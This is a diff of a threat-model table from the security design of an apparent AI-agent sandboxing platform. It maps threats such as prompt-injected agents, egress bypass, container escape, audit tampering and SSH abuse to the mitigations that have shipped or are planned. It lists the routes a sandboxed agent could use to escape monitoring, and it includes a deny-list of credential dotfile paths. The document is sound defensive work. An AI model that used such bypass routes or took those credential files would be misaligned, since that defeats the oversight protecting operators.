-| Env-var proxy bypass (documented industry bypass class) | Designed out at L0: the sandbox network is gatewayless (`Internal:true`), so ignoring the (compatibility-only) `HTTP_PROXY`/`HTTPS_PROXY` env vars reaches no route — the sole off-host path is the wardyn-proxy sidecar. **[shipped]** | L0, B2 |
-| Direct-IP / non-HTTP / metadata-server (169.254.169.254) egress | Two independent layers already close this — L1 below adds depth, it is not what this residual is waiting on. **L0 [shipped]:** each run's Docker network is `Internal:true` (gatewayless), so the sandbox has no off-host route at all; 169.254.169.254 is structurally unreachable regardless of what runs inside it. **L2 [shipped]:** even a request that DOES reach the proxy is independently checked against an unconditional IP guard — a literal-IP target is denied before policy or approval ever run (`evaluate` step 0, `internal/egress/proxy/proxy.go`), and every direct-dialed hostname is re-vetted post-DNS-resolution (`VetHost`/`isBlockedIP`, `internal/egress/proxy/policy.go`) against loopback/link-local/multicast/unspecified, RFC1918/ULA/reserved, and NAT64-embedded-v4 ranges — a check that runs AFTER, and is unaffected by, the policy verdict, so a host that `allow_all_egress` would otherwise pass is still denied if it resolves into one of those ranges (the one hop that defers this post-resolution re-check — the opt-in upstream corp-proxy lane, where the corp proxy performs its own DNS+dial — is §5's disclosed TOCTOU residual, and the step-0 literal-IP denial still holds there). **The one admin-authored exception** — `SiteConfig.InternalHosts` lifting the RFC1918/ULA/CGNAT slice for a declared hostname (`vetHostLift`/`Proxy.vetHost`) — never touches loopback/link-local/metadata/multicast/NAT64, and never lifts an address on the proxy's own interface subnets or its resolved control-plane host, so the metadata address stays unreachable through it regardless of what an operator declares, and on the Docker topology so do the proxy's own `wardyn-internal` network neighbors (Postgres/Dex/the registry container); on Kubernetes those neighbors are ClusterIP Services off the pod's interface, so there the bound is the declared `cidrs` (`docs/OPERATIONS.md` § Internal hosts). L2's guard lives in the proxy's own code, not the network topology, so — unlike L0 — it does not depend on Docker's gatewaylessness to hold. L1 default-deny nftables/NetworkPolicy + an explicit cloud-metadata firewall **[v0.5+ — planned]** is a third, kernel-level layer for defense-in-depth (chiefly: a non-HTTP path that bypasses the proxy process entirely, and parity on the v0.5 Kubernetes topology, where a pod is not gatewayless by default the way a Docker `Internal:true` network is) — not a precondition for the metadata block itself. | L0, L2 (L1 v0.5 adds depth) |
-| MCP/tool-call egress that bypasses the network proxy | Caught at L3 separate tool-call gateway enforcement plane (the documented MCP-blind-firewall class designed out). **[v0.5+ — planned]**; L3 does not exist today, so this class is currently open below L2. | L3, B3 |
-| Container-runtime escape via known runc/containerd CVE classes | On the shipped Docker path: cap-drop ALL + no-new-privileges + tmpfs + RuntimeDefault seccomp (never `unconfined`) + host-gated AppArmor (`apparmor=docker-default`) pinning **[shipped]**; on Kubernetes, container-level PSS hardening (RunAsNonRoot, drop-ALL caps, no privilege escalation, RuntimeDefault seccomp — `baseSecurityContext`, `internal/runner/k8s/naming.go`) is **[shipped]** on every pod, while userns (`hostUsers:false`) + no hostPath stay **[planned]**. Default CC2 (gVisor) interposes a userspace kernel when `runsc` is present. | CC2 isolation, L0 |
-| Syscall-surface kernel attacks | In scope at CC2 (gVisor userspace kernel interception) default and CC3 (Kata hardware-virt boundary) for adversarial workloads. | CC2, CC3 |
-| Host-side RCE at image-wrap time from a hostile Bring-Your-Own-Image base (`ONBUILD` triggers) | BYOI (`internal/envbuild` `FinalizeBase`) wraps an operator-named base with the runner tools via a `FROM` + `COPY` on the host daemon — outside the untrusted-build sandbox and outside every confinement tier. A `FROM` fires any `ONBUILD` triggers baked into the base, so a hostile base could run code on the host *before* any confinement exists. Docker exposes no flag to suppress triggers, so the base is preflighted (`ImageInspect`) and the wrap is **refused** if it declares any (`assertWrapSafeBase`), on both the BYOI and devcontainer paths; Wardyn also pulls the base itself rather than via the builder's `PullParent`, so the wrap builds `FROM` the exact image the preflight inspected **[shipped]**. Residual: wrapping is not vetting — base content is unscanned/unattested and digest pinning is honored but NOT enforced (see §5 residual 13). | B1 |
-| Over-broad or replayed minted credentials | Down-scoped at mint (repo + permission, audience-bound per RFC 8707, 1h TTL) **[shipped]**; kill-switch cascade on run end **[shipped]**. Bot-branch-only push confinement is **[shipped, default-on]** on the brokered git path (push-ref inspection in `internal/egress/proxy/git_broker.go`; `agent-run` names the run branch `wardyn/<run-id>/work` so a stock run complies, `WARDYN_GIT_BROKER_ENFORCE_BRANCH_NS=false` opts out), and dispatch makes the brokered route the only route to those GitHub host **names** — it subtracts + denies `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, and now the forge's `ssh.<forge>` SSH-over-443 endpoint too, for a run with git grants — and the credential helper refuses to mint an installation token into a brokered sandbox. **The parser binds the brokered App lane only, but on the SAME forge no second lane is left beside it.** `git_pat` (opaque CONNECT) and `ssh_key` (not smart-HTTP) carry no refs the proxy can read, so no receive-pack parser can bind them directly — but for a forge the run is actually brokered for, `validateGrantLaneExclusivity` refuses a policy that declares both a `github_token` and an `ssh_key` **or** `git_pat` grant for it, and `dropBrokeredGrants` withholds any already-stored `ssh_key` **or** `git_pat` grant from the sandbox env at dispatch (on top of the endpoint deny above), so the key is never resident and there is no push path the parser doesn't see. Those two mechanisms bind the SAME forge only: an `ssh_key` for a forge the run holds no `github_token` for remains bounded by the operator who supplied it, not by Wardyn — §5.1a states each bound, and `docs/POLICIES.md` states which lane a given policy puts a run in. Token-side confinement — a property that would hold even for a leaked token — is now **read-verifiable and gateable**: `VerifyRefRuleset` reads a GitHub repository ruleset back and `WARDYN_GITHUB_REQUIRE_REF_RULESET` (opt-in, default off) refuses the mint when it is absent or unverifiable; the token itself is still repo-scoped but not branch-scoped, and Wardyn never creates the ruleset (needs repo-admin it deliberately does not hold). | B4, B5, ID |
+| Prompt-injected agent reads resident secrets | Secrets are never in the sandbox, with a named, bounded exception list — **§5.1a is the complete set**. Every other credential is late-bound via the broker and injected proxy-side. Output masking **[shipped]**, with two named unmasked paths and a fail-open registry — §4.1 | B1, B2, B4 |
+| Env-var proxy bypass (documented industry bypass class) | Designed out at L0: the sandbox network is gatewayless (`Internal:true`), so ignoring the compatibility-only `HTTP_PROXY`/`HTTPS_PROXY` reaches no route. **[shipped]** | L0, B2 |
+| Direct-IP / non-HTTP / metadata-server (169.254.169.254) egress | Closed twice over, independently: **L0 [shipped]** gatewaylessness (no off-host route at all) and **L2 [shipped]**'s unconditional IP guard, which runs AFTER the policy verdict so `allow_all_egress` cannot pass it — §4.2. L1 🟡 **[planned]** adds kernel-level depth; the metadata block does not wait on it | L0, L2 (L1 adds depth) |
+| MCP/tool-call egress that bypasses the network proxy | Caught at L3, a separate tool-call gateway plane (the documented MCP-blind-firewall class designed out). 🟡 **[planned]**; L3 does not exist today, so this class is open below L2. | L3, B3 |
+| Container-runtime escape via known runc/containerd CVE classes | Hardened-runc floor on Docker (cap-drop ALL, no-new-privileges, tmpfs, RuntimeDefault seccomp — never `unconfined` — host-gated AppArmor) and container-level PSS hardening on every Kubernetes pod (`baseSecurityContext`, `internal/runner/k8s/naming.go`) **[shipped]**; userns (`hostUsers:false`) + no hostPath **[planned]** — §7 CC1 states the full posture. Default CC2 (gVisor) interposes a userspace kernel where `runsc` is present. | CC2, L0 |
+| Syscall-surface kernel attacks | In scope at CC2 (gVisor userspace kernel interception, default) and CC3 (Kata hardware-virt boundary) for adversarial workloads. | CC2, CC3 |
+| Host-side RCE at image-wrap time from a hostile BYOI base (`ONBUILD` triggers) | A `FROM` fires `ONBUILD` triggers baked into the base — the one way a base's content reaches the host *before* confinement exists. Docker offers no flag to suppress them, so the base is preflighted (`ImageInspect`) and the wrap **refused** if it declares any (`assertWrapSafeBase`), on the BYOI and devcontainer paths; Wardyn pulls the base itself rather than via `PullParent`, so the wrap builds `FROM` the exact image inspected **[shipped]**. Wrapping is not vetting — residual #13 states what stays open. | B1 |
+| Over-broad or replayed minted credentials | Down-scoped at mint (repo + permission, audience-bound per RFC 8707, 1h TTL) **[shipped]**; kill-switch cascade on run end **[shipped]**; bot-branch-only push confinement **[shipped, default-on]** (`internal/egress/proxy/git_broker.go`). Endpoint deny, lane exclusivity and the `VerifyRefRuleset` gate: asset #4. Token-side confinement is read-verifiable and gateable, never created by Wardyn. | B4, B5, ID |
 | Confused-deputy against the token broker | SVID-authenticated callers; egress allowlist and injection-rule registration are separate capabilities. | B4 |
-| Insider hiding behind agent identity | `sub=human` + `act=agent-run-SPIFFE-ID` + `sponsor` in every token, commit, and audit event. The agent never replaces the human in the chain — it is added to it. | AU, ID |
-| Insider exceeding own access via agent | Minted credentials are scoped to the task, not to the human's full access; the agent never inherits developer credentials. PARTIAL: that ceiling is set by policy/site-config, and rewriting either is an OPERATOR act — policy CRUD and `PUT /site-config` sit behind `requireOperator`, so with `WARDYN_OIDC_OPERATOR_EMAILS` set a signed-in viewer cannot raise their own ceiling. Above that line nothing separates duties: every named operator (and the admin token, always) can rewrite the policy that bounds them, and there is exactly one operator tier. See residual #14. | B5, ID |
-| Member escalating past a capability grant | **[v0.6 shipped]** A capability grant (`capability_grants`, migration `0042`) bounds what a MEMBER chose, on four closed kinds: `egress_host`, `secret` and `workspace` NARROW what a member could already do, and `image` WIDENS — without both its switch on and an exact-ref grant a member cannot name a custom image at all (`devcontainer_repo` is deliberately not a kind and stays unconditionally admin-only: it executes attacker-authored build configuration, which is not a power to hand out one row at a time). One resolver answers both directions (`capAllowed`/`capGranted`, `internal/api/capabilities.go`) on a fixed precedence: admins, the admin token and local mode are EXEMPT — a capability bounds the tier below the one writing the grants; then any matching **deny**; then any matching **allow**; then the per-kind enforcement switch; and a store error answers `500` rather than reading as permission. Deny sits ABOVE the switch on purpose, so one host can be blacklisted for one contractor without taking the whole deployment fail-closed, and there is no user-over-group precedence (a user allow overriding a group deny is a breach report, not a feature). `egress_host` values are matched by `entryCoversAny` — the SAME matcher the egress substitution drop already uses, never a second one that could disagree about a port suffix — and deny rows match on overlap in either direction, so a narrower request cannot slip under a broader deny nor a broader one over a narrower deny; every other kind is an exact compare, and grant values are shape-validated at the write boundary. The enforcement seams are `narrowMemberInlinePolicy` (a member's own `inline_policy` allowlist and secret refs), `denyMemberRequest` (`workspace_id`, `image`, `devcontainer_repo`), `authorizeMemberDecision` (which host a member may decide an `egress_domain` approval for) and `handleListSecrets` (which names `GET /secrets` lists back). **The doctrine is the security-relevant half: a capability never narrows what the ADMIN pre-authorized** — a stored policy, a workspace's own requirements, scan-seeded hosts and the model provider's own egress stay untouched no matter what the member holds, because narrowing them would brick workspace runs at scale and a member who cannot be trusted with a workspace should not be granted the workspace. Grant CRUD and the switch map are `operatorOnly` and audited (`capability.grant.created` / `.updated` / `.deleted`, `capability.enforcement.write`); every member refusal that is not a plain foreign-resource 404 audits as `authz.denied` with a `reason` drawn from a closed vocabulary (`capability_workspace`, `capability_egress_host`, `capability_secret`, `byoi_member`, `grant_pairing_not_eligible`). **EVERY switch ships OFF** — an absent `capability_enforcement` row is not enforced — so a 0.5 deployment upgraded with no rows written behaves byte-for-byte as it did before. That default is fail-open BY DESIGN, chosen for adoption over posture, and residual #20 states what it and three narrower gaps under it cost. | B5, ID, AU |
-| Member mounting a host directory the operator never allowed | **[v0.6 shipped]** A member-owned workspace is the ONLY path on which a non-operator supplies a host bind source (`composer.Clamp` still drops every composer-proposed and inline-policy mount unconditionally), and it is gated harder than the operator path, additively: the operator deny-list (`ValidateMountSource`) runs first and unchanged, then the source's **canonicalized real path** (`filepath.EvalSymlinks`, fail-CLOSED on any resolve error — no lexical fallback) must sit inside an operator/MDM-set root (`WARDYN_MEMBER_WORKSPACE_ROOTS`, or that principal's `_MAP` entry, which REPLACES the shared list), and must neither BE nor TRAVERSE a credential dotfile path (`.ssh`, `.aws`, `.claude`, `.wardyn`, `.gnupg`, `.docker`, `.kube`, `.config/gh`, `.netrc`, `.git-credentials`, `.git/config`). Unset roots = **no member host mounts at all**. Writability is a SECOND, narrower allowlist (`WARDYN_MEMBER_WRITABLE_ROOTS` minus `WARDYN_MEMBER_WRITABLE_DENY`, deny first and winning); both unset = every member mount read-only. Because the within-root test runs on the RESOLVED path, a symlink inside a root aimed out of every root is refused — the escape a lexical prefix check misses — and because the deny-list matches the resolved path too, a root set carelessly at `$HOME` still cannot hand a member their own `~/.ssh`. The check runs at onboarding, again at run-create, and a THIRD time in the docker driver immediately before `ContainerCreate` (`agentMounts`, on `Mount.MemberAuthored` only), which is what makes a source repointed between onboarding and launch fail closed. Gating on `MemberAuthored` rather than on "this is a member run" is load-bearing: the operator's staged `~/.claude` and Bedrock `~/.aws` binds ride the same spec and live outside every member root by construction. The roots bound what a MEMBER may name, nothing else — an operator run carries no roots and takes exactly the pre-0.6 path. Residuals #25 and #26. | B1, ID |
-| Audit tampering by in-sandbox actor | Append-only Postgres log (UPDATE/DELETE trigger raises exception) **[shipped]**; tamper-proof eBPF/Tetragon ground-truth stream **[shipped]** (host sensor + `wardyn-tetragon-ingest` -> `kernel.*` events via `POST /api/v1/internal/groundtruth`), correlated on `run_id`, exported free to SIEM. PTY replay is tamper-EVIDENT, not tamper-proof: the recording-upload route accepts a run-token-authenticated PUT for the run's whole lifetime and upserts on conflict, so an in-sandbox actor can overwrite its own cast with a fabricated one before the run ends — but every upload, real or overwriting, emits its own `recording.upload` row in the append-only log above, so a second upload is visible there even though the PTY bytes it replaced are not recoverable. Detection-only (the `ld-linux`/`mmap` loader bypass is flagged, never blocked); honestly degradable (`/healthz` reports `ebpf_groundtruth=unavailable` without a sensor); host eBPF is blind inside CC3/Kata guests (emits `kernel.sensor.blind`). | AU |
-| Audit rewriting by a DATABASE-level actor (past the append-only triggers) | **[v0.6 shipped]** The row above is bounded by triggers, and triggers bind nobody who can `ALTER TABLE ... DISABLE TRIGGER`: a table OWNER or superuser can rewrite an `audit_events` row, which `0007_audit_least_privilege.sql` already publishes as a residual. Migration `0047_audit_hash_chain.sql` does not close that — it makes ONE use of it detectable. Every post-migration row carries `row_hash = SHA-256(prev_hash || canonical(id, time, run_id, actor_type, actor, action, target, outcome, source_ip, data))`, computed **inside Postgres** in a `BEFORE INSERT` trigger, so the writer cannot choose it and both in-tree insert paths (the store and the broker's in-tx `credential.mint`) inherit the chain. Editing one row breaks its own hash; deleting one breaks its neighbours' link; the operator-invoked sweep (`GET /api/v1/audit/chain/verify`, admin-only, never run at boot) names the first broken `seq` and why. **WHAT IT IS NOT: tamper-EVIDENCE, not tamper-proofness.** An actor who can rewrite one row can usually rewrite every row after it and re-chain the whole tail, and a re-chained tail verifies perfectly clean; truncating the newest rows leaves a shorter, valid chain and is likewise invisible to the chain alone. The control against both is OFF-BOX and is a separate promise: the audit-sink stream carries each row's `prev_hash`/`row_hash`, so a SIEM holds head hashes, and a chain that no longer contains a recorded head has been rewritten or truncated. Rows written before the migration keep NULL hashes and are outside the chain (no backfill — hashes computed after the fact by the process that could have altered the rows prove nothing). Signed receipts under a key no database role can reach are the next rung and are **NOT built**. | AU |
-| Delegation-chain-splicing on nested `act` claims (IETF March 2026) | Chain integrity-protected end-to-end. Flagged as active research area; we defend and monitor, not declare solved. | ID, B5 |
-| Inter-tenant lateral movement | On the shipped Docker path: a separate per-run `Internal:true` network per sandbox (no shared bridge, no cross-run route) + per-run identity scoping **[shipped]**. Default-deny east-west NetworkPolicy **[shipped]** on Kubernetes (empty-ingress + own-proxy-only egress per sandbox pod, `internal/runner/k8s/sandbox.go`). | B1, L0 (L1 v0.5), ID |
-| Fleet-policy disablement before malicious action | Policy changes are themselves audited events — policy CRUD emits `policy.create/update/delete` **[shipped]**. Fail-closed narrow-only managed settings (`disableBypassPermissionsMode`) **[v0.5+ — planned]**. | AU |
-| Slowloris / connection exhaustion against the new SSH pre-auth listener | **[v0.5+ shipped]** Per-connection handshake deadline (cleared once authenticated — never bounds a live session), `MaxAuthTries`, and a bounded total concurrent-connection count (a connection over the cap is closed before any handshake byte is exchanged) — `ssh.NewServerConn` otherwise blocks forever with no library-default timeout. A SEPARATE bound covers the gap the handshake deadline structurally cannot: it is a `net.Conn` deadline, so it does nothing while `PublicKeyCallback` (`sshAuth`) is blocked on a store call or an audit write rather than on socket I/O — `sshAuth` wraps its own work in a `sshAuthTimeout` (5s) context, so a stuck backend call can no longer let an unauthenticated client park a connection slot indefinitely. Off entirely (`WARDYN_SSH_LISTEN` unset) is the default. | B9 |
-| Impersonation / unregistered-key access to the SSH gateway | **[v0.5+ shipped]** Public-key auth only (no password/keyboard-interactive method is ever offered); the trust root is a fingerprint a human registers against their OWN principal (`POST /api/v1/me/ssh-keys`, self-service, no admin-on-behalf-of); authorization is owner-or-admin (`run.created_by == the key's principal`, OR the key's `role` column — migration `0043`, stamped at registration and re-stamped bounded-stale on every OIDC login (migration `0046`, `WARDYN_SSH_ROLE_TTL`), never read live, residual #15 — reads `admin`); a member's key never satisfies the override, so a member still has no path to another human's run over either transport. Every attempt (success and failure, including an unknown key or a malformed run-id username) is audited under `ssh.auth`, with the source IP and — where a real registered key was involved (e.g. authenticated but not this run's owner) — the actual principal, not a bare "unknown". | B9, AU |
-| SSH session resource exhaustion against one run | **[v0.5+ shipped]** A small, documented per-run cap on concurrent SSH channels — `session` (shell/exec/sftp) AND `direct-tcpip` (`-L` forwards) draw from the SAME counter — independent of the connection-level cap above — bounds how much of the daemon's own resources ONE run's owner can consume via parallel shells or forwards, not just how many strangers can knock. | B9 |
-| Unrecovered panic in a per-channel SSH goroutine crashing the daemon (and its kill switch) | **[v0.5+ shipped]** Every per-connection AND per-channel goroutine (session dispatch, direct-tcpip dispatch, shell/exec/sftp bridge) runs through one shared `sshGo` wrapper with `recover()` — a bug in any one SSH session is contained to that session, never the process. Structurally distinct from a nil-Runner panic: `sshFreshRun` (every bridge's first call) refuses closed with a clean channel error when no Runner is configured (`-runner none`, a supported headless mode) instead of dereferencing a nil interface. | B1, B9 |
-| SSH `-L` forwarding reaching past the sandbox | **[v0.5+ shipped]** The forwarding destination is validated as the sandbox's OWN loopback (`127.0.0.1`/`::1`/`localhost`) before any exec runs — refused otherwise, with a reason. Belt-and-suspenders: the sandbox has no OTHER route to forward to regardless (L0 structural confinement, invariant 3 — no new network path is opened; the primitive is `socat` running INSIDE the existing sandbox netns, bridged the same way `sftp-server` is). `-R` (remote/reverse forwarding) and agent/X11 forwarding are refused outright: the gateway serves no global requests (so `tcpip-forward` gets the client's own "request denied by peer" error) and never accepts the channel types either forwarding kind rides on. | B1, B9 |
-| Sandbox-authored page reading the console session (UI-sandbox relay) | **[v0.6 shipped]** The relayed app is code from inside B1 running in the operator's browser, so it is treated as hostile page content, not as a Wardyn surface. It is served on a SEPARATE ORIGIN (`WARDYN_UI_SANDBOX_LISTEN`) and boot REFUSES an address equal to `-listen` — not "address in use", a named refusal saying what the shared origin would break (`validateUISandboxConfig`, `cmd/wardynd`). Because cookies are not port-scoped, a shared *hostname* would still leak: every forwarded request has ALL `wardyn_*` cookies plus `Authorization`/`Proxy-Authorization` and any `?ticket` STRIPPED, and every response has `Set-Cookie: wardyn_*` DROPPED (cookie tossing — a sandbox-set `wardyn_ui_sess` or console session cookie would be an authentication attack, not a rendering quirk). Both directions are pinned by tests (`internal/api/uigateway_test.go`). `Referrer-Policy: no-referrer` on every gateway response keeps the enter URL's ticket out of the app's outbound links, and `X-Forwarded-*` is removed and deliberately not re-added (the sandbox does not learn the operator's IP). The console never embeds a relayed app in an iframe — that would put the content back on the console origin, defeating all of the above. | B10, B1 |
-| Unauthenticated / cross-run access to a relayed UI app | **[v0.6 shipped]** The UI listener has EXACTLY ONE authentication mechanism and never falls through to the console's session cookie or the admin bearer: a single-use, 30s, owner-or-admin attach ticket (the SAME `POST /runs/{id}/attach-ticket` the browser terminal mints — no second ticket type) is redeemed at `/__wardyn/enter`, which then RE-CHECKS against freshly-loaded state what the ticket cannot prove on its own (owner-or-admin for THIS run, run still `RUNNING` with a sandbox, app actually declared in the run's EFFECTIVE policy — resolved from the `run.policy.effective` envelope, never through `policy_id`, so an inline-policy run can never inherit the default policy's apps). Only then is an HMAC-signed session cookie issued, `HttpOnly`, `SameSite=Lax`, and `Path=/r/<run-id>/` — path-scoped so one run's page cannot make the browser attach another run's session. Every cookie failure (absent, malformed, forged, expired) answers one indistinguishable 403: no fallback to negotiate, no oracle to probe. Every enter, success or denial, is audited (`ui.auth`). | B10, AU |
-| Relay reaching a port the operator never declared | **[v0.6 shipped]** The relay serves only ports in the policy's `ui_apps` — operator-authored, at most 8, validated wherever a policy enters (stored, inline, `WARDYN_DEFAULT_POLICY`). The port is captured from the effective policy AT TICKET REDEMPTION into the signed cookie, so no later request can name a different one, and the dial target is re-verified against that session on every connection. Policy names an app, never a command string: what starts is the image's own `/usr/local/bin/wardyn-ui-<name>` launcher, so a policy write can never choose what executes inside the sandbox. `ssh -L` remains the undeclared-port escape hatch, bounded by its own owner-or-admin gate. | B1, B10 |
-| Exec/resource exhaustion through relay connections | **[v0.6 shipped]** Each relay connection is one live `socat` exec inside the sandbox, so it carries a per-run bound of its own, a sibling of the SSH gateway's per-run channel cap rather than the same number: at most 8 concurrent relay connections per run (`maxUIConnsPerRun`, against the gateway's `maxSSHSessionsPerRun = 4` — browsers open ~6 connections per origin, so 8 is that plus headroom, while an SSH client opens channels one shell at a time), and a pooled idle connection is closed after 90s so a closed tab stops holding relay capacity. What that bounds is concurrent relay connections, NOT the execs behind them: neither substrate offers "kill this exec", so closing a connection only closes the exec's streams, and a `socat` whose app-side half the app still holds open lingers until the sandbox stops. That ceiling is published, not hidden — `docs/UI-SANDBOXES.md` "Resource bounds", the constant's own comment (`uiIdleConnTimeout`, `internal/api/uigateway.go`), and `scripts/run-e2e-ui-sandbox.sh`, which asserts the bound this actually promises (20 relayed requests must not become 20 execs) and prints what remains rather than claiming zero. A run reload on every new connection means a stopped or killed run stops serving (409) instead of opening more. | B10, B1 |
+| Insider hiding behind agent identity | `sub=human` + `act=agent-run-SPIFFE-ID` + `sponsor` in every token, commit and audit event. The agent never replaces the human in the chain — it is added to it. | AU, ID |
+| Insider exceeding own access via agent | Minted credentials are scoped to the task, not the human's full access; the agent never inherits developer credentials. PARTIAL: that ceiling is set by policy/site-config, and rewriting either is an OPERATOR act — policy CRUD and `PUT /site-config` sit behind `requireOperator`, so with `WARDYN_OIDC_OPERATOR_EMAILS` set a signed-in viewer cannot raise their own ceiling. Above that line nothing separates duties — residual #14. | B5, ID |
+| Member escalating past a capability grant | **[v0.6 shipped]** Capability grants (`capability_grants`, migration `0042`) bound what a MEMBER chose on four closed kinds, resolved deny-before-allow-before-switch by one resolver (`capAllowed`/`capGranted`). **EVERY switch ships OFF** — fail-open by design, residual #20 — and a capability never narrows what the ADMIN pre-authorized. Mechanism: §4.3 | B5, ID, AU |
+| Member mounting a host directory the operator never allowed | **[v0.6 shipped]** A member-owned workspace is the ONLY path on which a non-operator supplies a host bind source, gated additively: operator deny-list, then a canonicalized real path inside an operator/MDM-set root, then a credential-dotfile deny-list. Unset roots = no member host mounts at all. Mechanism: §4.4. Residuals #25, #26 | B1, ID |
+| Audit tampering by in-sandbox actor | Append-only Postgres log (UPDATE/DELETE trigger raises exception) **[shipped]**; tamper-proof eBPF/Tetragon ground-truth stream **[shipped]** (host sensor + `wardyn-tetragon-ingest` → `kernel.*` via `POST /api/v1/internal/groundtruth`), correlated on `run_id`, exported free to SIEM. PTY replay is tamper-EVIDENT, not tamper-proof: the upload route accepts a run-token-authenticated PUT for the run's whole lifetime and upserts on conflict, so an in-sandbox actor can overwrite its own cast before the run ends — but every upload emits its own `recording.upload` row, so the overwrite is visible even though the replaced bytes are not recoverable. Detection-only (the `ld-linux`/`mmap` bypass is flagged, never blocked); honestly degradable (`/healthz` reports `ebpf_groundtruth=unavailable`); host eBPF is blind inside CC3/Kata (`kernel.sensor.blind`). | AU |
+| Audit rewriting by a DATABASE-level actor (past the append-only triggers) | **[v0.6 shipped]** Migration `0047_audit_hash_chain.sql` makes ONE such rewrite detectable: every post-migration row carries a `row_hash` computed **inside Postgres** in a `BEFORE INSERT` trigger, so the writer cannot choose it. **Tamper-EVIDENCE, not tamper-proofness** — a re-chained tail verifies clean. Detail: §4.5 | AU |
+| Delegation-chain-splicing on nested `act` claims (IETF March 2026) | Chain integrity-protected end-to-end. Flagged as active research; we defend and monitor, not declare solved. | ID, B5 |
+| Inter-tenant lateral movement | Docker: a separate per-run `Internal:true` network per sandbox (no shared bridge, no cross-run route) + per-run identity scoping **[shipped]**. Kubernetes: default-deny east-west NetworkPolicy **[shipped]** (empty-ingress + own-proxy-only egress per sandbox pod, `internal/runner/k8s/sandbox.go`). | B1, L0 (L1), ID |
+| Fleet-policy disablement before malicious action | Policy changes are themselves audited — policy CRUD emits `policy.create/update/delete` **[shipped]**. Fail-closed narrow-only managed settings (`disableBypassPermissionsMode`) 🟡 **[planned]**. | AU |
+| Slowloris / connection exhaustion against the SSH pre-auth listener | **[v0.5+ shipped]** Per-connection handshake deadline (cleared once authenticated — never bounds a live session), `MaxAuthTries`, and a bounded concurrent-connection count (a connection over the cap is closed before any handshake byte) — `ssh.NewServerConn` otherwise blocks forever with no library-default timeout. A SEPARATE bound covers what a `net.Conn` deadline cannot: `sshAuth` wraps its own work in a `sshAuthTimeout` (5s) context, so a `PublicKeyCallback` stuck on a store call or audit write cannot park a slot indefinitely. Off (`WARDYN_SSH_LISTEN` unset) is the default. | B9 |
+| Impersonation / unregistered-key access to the SSH gateway | **[v0.5+ shipped]** Public-key auth only (no password/keyboard-interactive method is ever offered); the trust root is a fingerprint a human registers against their OWN principal (`POST /api/v1/me/ssh-keys`, self-service, no admin-on-behalf-of); authorization is owner-or-admin (`run.created_by == the key's principal`, OR the key's `role` column — migration `0043`, re-stamped bounded-stale on every OIDC login (`0046`, `WARDYN_SSH_ROLE_TTL`), never read live, residual #15). A member's key never satisfies the override. Every attempt is audited under `ssh.auth` with the source IP and, where a registered key was involved, the actual principal rather than "unknown". Bounds: `docs/SSH.md`. | B9, AU |
+| SSH session resource exhaustion against one run | **[v0.5+ shipped]** A per-run cap on concurrent SSH channels — `session` (shell/exec/sftp) AND `direct-tcpip` (`-L` forwards) draw from the SAME counter — independent of the connection-level cap. | B9 |
+| Unrecovered panic in a per-channel SSH goroutine crashing the daemon (and its kill switch) | **[v0.5+ shipped]** Every per-connection AND per-channel goroutine runs through one shared `sshGo` wrapper with `recover()` — a bug in one session never reaches the process. Distinct from a nil-Runner panic: `sshFreshRun` (every bridge's first call) refuses closed with a clean channel error when no Runner is configured (`-runner none`, a supported headless mode). | B1, B9 |
+| SSH `-L` forwarding reaching past the sandbox | **[v0.5+ shipped]** The destination is validated as the sandbox's OWN loopback (`127.0.0.1`/`::1`/`localhost`) before any exec runs — refused otherwise, with a reason — and the sandbox has no OTHER route to forward to regardless (L0, invariant 3; the primitive is `socat` inside the existing netns). `-R` and agent/X11 forwarding are refused outright: the gateway serves no global requests (so `tcpip-forward` gets "request denied by peer") and never accepts either channel type. | B1, B9 |
+| Sandbox-authored page reading the console session (UI-sandbox relay) | **[v0.6 shipped]** The relayed app is code from inside B1 running in the operator's browser, treated as hostile page content: served on a SEPARATE ORIGIN, with boot REFUSING a listen address equal to `-listen` (`validateUISandboxConfig`, `cmd/wardynd`). Cookies are not port-scoped, so a shared *hostname* would still leak: every forwarded request has ALL `wardyn_*` cookies plus `Authorization`/`Proxy-Authorization` and any `?ticket` STRIPPED, and every response has `Set-Cookie: wardyn_*` DROPPED (a sandbox-set `wardyn_ui_sess` would be an authentication attack, not a rendering quirk) — both pinned by `internal/api/uigateway_test.go`. `Referrer-Policy: no-referrer` keeps the enter URL's ticket out of outbound links; `X-Forwarded-*` is removed and deliberately not re-added. The console never iframes a relayed app. | B10, B1 |
+| Unauthenticated / cross-run access to a relayed UI app | **[v0.6 shipped]** EXACTLY ONE authentication mechanism, never falling through to the console session cookie or admin bearer: a single-use, 30s, owner-or-admin attach ticket (the SAME `POST /runs/{id}/attach-ticket` the browser terminal mints) redeemed at `/__wardyn/enter`, which RE-CHECKS against fresh state what the ticket cannot prove — owner-or-admin for THIS run, run still `RUNNING` with a sandbox, app declared in the run's EFFECTIVE policy (from the `run.policy.effective` envelope, never `policy_id`, so an inline-policy run cannot inherit the default policy's apps). Only then is an HMAC-signed cookie issued: `HttpOnly`, `SameSite=Lax`, `Path=/r/<run-id>/`. Every cookie failure answers one indistinguishable 403: no fallback, no oracle. Every enter is audited (`ui.auth`). | B10, AU |
+| Relay reaching a port the operator never declared | **[v0.6 shipped]** Only ports in the policy's `ui_apps` — operator-authored, at most 8, validated wherever a policy enters (stored, inline, `WARDYN_DEFAULT_POLICY`). The port is captured from the effective policy AT TICKET REDEMPTION into the signed cookie, so no later request can name a different one, and the dial target is re-verified per connection. Policy names an app, never a command string: what starts is the image's own `/usr/local/bin/wardyn-ui-<name>` launcher. `ssh -L` remains the undeclared-port escape hatch, bounded by its own owner-or-admin gate. | B1, B10 |
+| Exec/resource exhaustion through relay connections | **[v0.6 shipped]** Each relay connection is one live `socat` exec, bounded per-run at 8 concurrent (`maxUIConnsPerRun`, vs the gateway's `maxSSHSessionsPerRun = 4`), pooled idle connections closed after 90s. That bounds connections, NOT the execs behind them: neither substrate offers "kill this exec", so a `socat` whose app-side half is still held lingers until the sandbox stops. Published, not hidden — `docs/UI-SANDBOXES.md` "Resource bounds", `uiIdleConnTimeout`'s own comment (`internal/api/uigateway.go`), and `scripts/run-e2e-ui-sandbox.sh`, which asserts what this promises (20 relayed requests must not become 20 execs). A run reload per connection means a stopped run stops serving (409). | B10, B1 |
+
+### 4.1 Output masking, and the paths it does not cover
+
+SecretRegistry masking (`<secret-hidden>`, `internal/secretmask`) covers the
+default brokered recording-upload path, audit events and proxy decision logs
+**[shipped]**. It is **verbatim-match only**. On the upload path the body is
+asciicast JSON, so each secret's JSON-escaped rendering is masked alongside its
